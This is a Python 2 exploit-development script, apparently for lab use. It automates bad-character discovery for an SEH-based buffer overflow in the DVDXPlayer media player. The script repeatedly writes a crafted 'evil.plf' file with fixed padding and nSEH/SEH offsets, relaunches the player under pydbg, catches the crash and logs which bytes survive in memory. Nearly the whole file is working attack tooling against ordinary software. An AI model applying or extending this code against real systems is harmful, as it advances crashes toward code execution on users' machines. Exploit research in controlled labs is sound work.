#!/usr/bin/python
import sys
import socket
import struct
from pydbg import *
from pydbg.defines import *
import pythoncom
import struct
import random
import wmi
import subprocess
import os
import time
import threading
import os
import pyautogui
from pyautogui import press, typewrite, hotkey
from threading import Lock, Thread


allchars = ( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13" 
"\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26" 
"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39" 
"\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c" 
"\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f" 
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72" 
"\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85" 
"\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98" 
"\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab" 
"\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe" 
"\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1" 
"\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4" 
"\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7" 
"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

process_name = "DVDXPlayer.EXE"  ##CHANGE THIS
process_is_running = False
good_chars = []
bad_chars = []
lock = threading.Lock()
start_crash = False
start_cmd = "Z:\\quickzip\\dvdxplayer\\evil.plf"
#start_cmd = 'C:\\start.bat' ##CHANGE THIS
#start_cmd = "net start vulnserver.exe"

def start_service(process_name,start_cmd):
    global pid
    ##NOCHANGESINTHEFUNCTION
    pythoncom.CoInitialize ()
    for process in wmi.WMI().Win32_Process():
        if process.Name==process_name:
            print("[+] Stopping the service...")
            # Forcefully terminate the process
            subprocess.Popen('taskkill /im '+ process_name + ' /f').communicate()
            process_is_running = False

    print("[+] Starting the service...")
    # Start the process with reliability 
    #subprocess.Popen('taskkill /im ovas.exe /f').communicate()
    #subprocess.Popen('C:/Program Files/HP OpenView/bin/ovas.exe', stdin=PIPE, stderr=PIPE, stdout=PIPE).communicate() 
    #os.system(start_cmd)
    os.startfile(start_cmd)
    print ("[*] Waiting for the process to start ..")
    process_is_running = True
    time.sleep(1)
    pid = find_process_id(process_name, process_is_running)
    if pid:
        print("[+] The service was started.")
        global start_crash
        lock.acquire()
        start_crash = True
        lock.release()
        print "[+] Crash Flag set to" + str(start_crash)
    else:
        print("[-] Service was not found in process list. Restarting...")
        return start_service(process_name,start_cmd)

def find_process_id(process_name, process_is_running):
    ##NOCHANGESINTHEFUNCTION
    #Function to find the process ID and return pid
    # Get the process ID of the services

    print "[2] Making sure the service " + process_name + " was restarted and getting the pid"
    pythoncom.CoInitialize ()
    for process in wmi.WMI().Win32_Process():
        if process.Name==process_name:
            print "[+]The process is running with process id: " + str(process.ProcessId)
            return process.ProcessId

def check_accessv(dbg):
    ##NOCHANGESINTHEFUNCTION
    # We skip first-chance exceptions
    #if dbg.dbg.u.Exception.dwFirstChance:
    #        return DBG_EXCEPTION_NOT_HANDLED

    #crash_bin = utils.crash_binning.crash_binning()
    #crash_bin.record_crash(dbg)
    #print crash_bin.crash_synopsis()
    ##CHANGE THIS
    esp_offset = 0x148 # this is in hex
    print "[+] Access violation caught!!"
    print "EAX: %08x" % (dbg.context.Eax)
    print "ESP: %08x" % (dbg.context.Esp)
    print "EIP: %08x" % (dbg.context.Eip)
    # I had an offset of 37 or 0x25 from the ESP to crash payload
    esp_dump = dbg.read(dbg.context.Esp + esp_offset, 4) # dump 4 bytes in memory pointed by ESP
    esp_dump_hex = esp_dump.encode('hex')
    print esp_dump_hex
    identify_bad_characters(esp_dump_hex)
    #dbg.terminate_process()
    #return DBG_CONTINUE
    dbg.detach()
    return DBG_EXCEPTION_NOT_HANDLED

def start_debugging(pid):
    ##NOCHANGESINTHEFUNCTION
    print "[3] Attaching the process to pydbg"
    dbg = pydbg()
    dbg.attach(int(pid))
    dbg.set_callback(EXCEPTION_ACCESS_VIOLATION,check_accessv)
    dbg.run()
    #return start_service()

def identify_bad_characters(esp_memory_dump):
    ##NOCHANGESINTHEFUNCTION
    global good_chars, bad_chars

    if (esp_memory_dump == current_char * 4):
        print "[+] I found a good character: " + str(current_char)
        good_chars.append(current_char)
        with open("c:\\good_character_list.txt",'a+') as f:
            f.write("\\x" + str(current_char))
    else:
        print "[+] I found a bad character: " + str(current_char)
        bad_chars.append(current_char)
        with open("c:\\bad_character_list.txt",'a+') as f:
            f.write("\\x" + str(current_char))

    with open("c:\\all_character_list.txt", 'a+') as f:
        f.write("\\x" + str(current_char) + " => " + str(esp_memory_dump) +"\n" )
    print "[+] Printing all bad characters: " + str(bad_chars)
    print "[+] Printing all good characters: " + str(good_chars)

def crash_me():
    print("[+] Entered crash_me");
    global start_crash, current_char
    lock.acquire()
    start_crash = False
    lock.release()
    counter = 0
    timer= 0
    while True:
        print start_crash
        if start_crash:
            if counter < (len(allchars)):
                time.sleep(10)
                current_char = allchars[counter].encode('hex')
                print "[+] The currrent character is " + str(current_char) + " of index " + str(counter)
                junk0 = allchars[counter] * 4 # put the bad character here
                #Copy pasta the crash function here
                filename="evil.plf"
                 
                total_buffer = 2000
                nseh_offset = 608
                seh_offset = 612

                junk1 = "\x41" * nseh_offset
                #nseh = "\x42" * 4
                nseh = junk0
                seh = "\x42" * 4
                junk2 = "\x44" * (total_buffer - nseh_offset - len(nseh) - len(seh))

                payload = junk1 + nseh + seh + junk2

                try:
                    textfile = open(filename , 'w')
                    textfile.write(payload)
                    textfile.close()
                    time.sleep(1)
                    print "[1] File opened with " + str(len(payload)) + " and character " + str(junk0.encode('hex'))
                except:
                        print "File open failed"
                        sys.exit(1)
                time.sleep(1)
                pyautogui.hotkey('alt', 'tab')
                pyautogui.hotkey('alt', 'tab')
                time.sleep(1)
                press('L')

                start_crash = False
                print "[1] Crash Flag set to" + str(start_crash)
                counter+= 1
                print "[*] Waiting before sending the next evil payload .."
                time.sleep(10)
            else:
                print "[+] Succesfully completed going through all bad characters"
                exit(0)
        elif not start_crash:
            print "[*] Start crash flag not set"
            timer =0
            time.sleep(1)
            continue
        elif timer > 10:
            print "[-] Anomaly detected!!! - Waiting to restart ..."
            time.sleep(1)
            return start_service(process_name,start_cmd)

def main():

    crasher_thread = threading.Thread(target=crash_me)
    crasher_thread.setDaemon(0)
    crasher_thread.start()
    print("[+] Crash thread started");

    while True:
        start_service(process_name,start_cmd)
        start_debugging(pid)
        print "Process has been terminated"

if __name__ == '__main__':
    main()